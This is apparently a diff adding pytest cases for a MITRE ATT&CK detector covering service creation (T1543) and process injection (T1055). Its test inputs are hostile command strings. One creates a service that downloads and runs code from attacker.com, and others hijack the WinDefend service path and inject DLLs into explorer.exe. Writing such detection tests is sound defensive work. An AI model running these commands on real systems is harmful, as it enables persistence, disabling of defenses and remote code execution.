@@ -22,7 +22,7 @@ from pathlib import Path
 src_root = Path(__file__).resolve().parent.parent / "src"
 sys.path.insert(0, str(src_root))
 
-from core.detector import score_confidence, detect_t1059, detect_t1218, detect_t1027, detect_t1105, detect_t1071
+from core.detector import score_confidence, detect_t1059, detect_t1218, detect_t1027, detect_t1105, detect_t1071, detect_t1543, detect_t1055
 
 
 def test_score_confidence_zero_evidence():
@@ -614,3 +614,128 @@ def test_detect_t1071_output_structure():
     assert 'confidence' in detection
     assert 'evidence' in detection
     assert 'defensive_enrichment' in detection
+
+# ===== detect_t1543 Tests =====
+
+def test_detect_t1543_powershell_new_service():
+    """Test T1543.003 detection for PowerShell New-Service cmdlet."""
+    cmd = 'powershell.exe -c "New-Service -Name backdoor -BinaryPathName C:\\Windows\\System32\\cmd.exe"'
+    detections = detect_t1543(cmd)
+
+    assert len(detections) > 0
+    assert any(d['technique_id'] == 'T1543' for d in detections)
+
+
+def test_detect_t1543_sc_create_service():
+    """Test T1543.003 detection for sc.exe service creation."""
+    cmd = 'sc.exe create WindowsUpdate binPath= "C:\\Windows\\System32\\powershell.exe -nop -c IEX(New-Object Net.WebClient).DownloadString(\'http://attacker.com\')"'
+    detections = detect_t1543(cmd)
+
+    assert len(detections) > 0
+    assert any(d['technique_id'] == 'T1543' for d in detections)
+
+
+def test_detect_t1543_registry_services_modification():
+    """Test T1543.003 detection for registry-based service modification."""
+    cmd = "powershell.exe -c Set-ItemProperty -Path 'HKLM:\\System\\CurrentControlSet\\Services\\WinDefend' -Name ImagePath -Value 'C:\\malware.exe'"
+    detections = detect_t1543(cmd)
+
+    assert len(detections) > 0
+    assert any(d['technique_id'] == 'T1543' for d in detections)
+
+
+def test_detect_t1543_no_detections():
+    """Test T1543 returns no findings for benign commands."""
+    cmd = "powershell.exe -c Get-Service"
+    detections = detect_t1543(cmd)
+
+    assert len(detections) == 0
+
+
+def test_detect_t1543_output_structure():
+    """Test T1543 detection output schema consistency."""
+    cmd = 'sc.exe create backdoor binPath= "cmd.exe"'
+    detections = detect_t1543(cmd)
+
+    assert len(detections) > 0
+    detection = detections[0]
+    assert detection['technique_id'] == 'T1543'
+    assert 'technique' in detection
+    assert 'subtechnique_id' in detection
+    assert 'subtechnique' in detection
+    assert 'tactic' in detection
+    assert 'behavior' in detection
+    assert 'confidence' in detection
+    assert 'evidence' in detection
+
+
+# ===== detect_t1055 Tests =====
+
+def test_detect_t1055_createremotethread_pattern():
+    """Test T1055.001 detection for CreateRemoteThread API calls."""
+    cmd = 'cmd.exe /c rundll32.exe kernel32.dll,CreateRemoteThread'
+    detections = detect_t1055(cmd)
+
+    assert len(detections) > 0
+    assert any(d['technique_id'] == 'T1055' for d in detections)
+
+
+def test_detect_t1055_invoke_reflective_injection():
+    """Test T1055.002 detection for Invoke-ReflectivePEInjection."""
+    cmd = "powershell.exe -nop -c Invoke-ReflectivePEInjection -PEPath C:\\Windows\\Temp\\beacon.dll -Target explorer.exe"
+    detections = detect_t1055(cmd)
+
+    assert len(detections) > 0
+    assert any(d['technique_id'] == 'T1055' for d in detections)
+
+
+def test_detect_t1055_invoke_dll_injection():
+    """Test T1055.001 detection for Invoke-DllInjection."""
+    cmd = "powershell.exe -nop -c Invoke-DllInjection -ProcessName explorer -DllPath C:\\Temp\\malware.dll"
+    detections = detect_t1055(cmd)
+
+    assert len(detections) > 0
+    assert any(d['technique_id'] == 'T1055' for d in detections)
+
+
+def test_detect_t1055_loadlibrary_injection_chain():
+    """Test T1055.001 detection for LoadLibrary + CreateRemoteThread injection."""
+    cmd = "powershell.exe -c '[System.Runtime.InteropServices.RuntimeEnvironment]::LoadLibrary(\"kernel32\"); CreateRemoteThread(...).'"
+    detections = detect_t1055(cmd)
+
+    assert len(detections) > 0
+    assert any(d['technique_id'] == 'T1055' for d in detections)
+
+
+def test_detect_t1055_suspicious_target_process_injection():
+    """Test T1055.001 detection for injection into high-value processes."""
+    cmd = "powershell.exe -c VirtualAllocEx(svchost.exe) | WriteProcessMemory | CreateRemoteThread"
+    detections = detect_t1055(cmd)
+
+    assert len(detections) > 0
+    assert any(d['technique_id'] == 'T1055' for d in detections)
+
+
+def test_detect_t1055_no_detections():
+    """Test T1055 returns no findings for benign commands."""
+    cmd = "powershell.exe -c Get-Process"
+    detections = detect_t1055(cmd)
+
+    assert len(detections) == 0
+
+
+def test_detect_t1055_output_structure():
+    """Test T1055 detection output schema consistency."""
+    cmd = "powershell.exe -c Invoke-ReflectivePEInjection -PEPath beacon.dll"
+    detections = detect_t1055(cmd)
+
+    assert len(detections) > 0
+    detection = detections[0]
+    assert detection['technique_id'] == 'T1055'
+    assert 'technique' in detection
+    assert 'subtechnique_id' in detection
+    assert 'subtechnique' in detection
+    assert 'tactic' in detection
+    assert 'behavior' in detection
+    assert 'confidence' in detection
+    assert 'evidence' in detection
